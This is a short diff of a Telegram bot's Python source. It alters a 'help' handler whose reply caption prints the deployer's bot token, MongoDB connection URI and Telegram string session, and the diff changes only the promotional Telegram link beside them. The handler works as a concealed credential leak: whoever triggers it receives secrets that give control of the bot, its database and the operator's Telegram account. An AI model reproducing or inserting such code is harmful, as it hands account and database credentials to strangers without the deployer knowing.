@@ -594,7 +594,7 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://files.catbox.moe/ja6sd4.jpg",
-       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/VNI0X)............☆""",
+       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_DEADLY_VENOM_ll)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
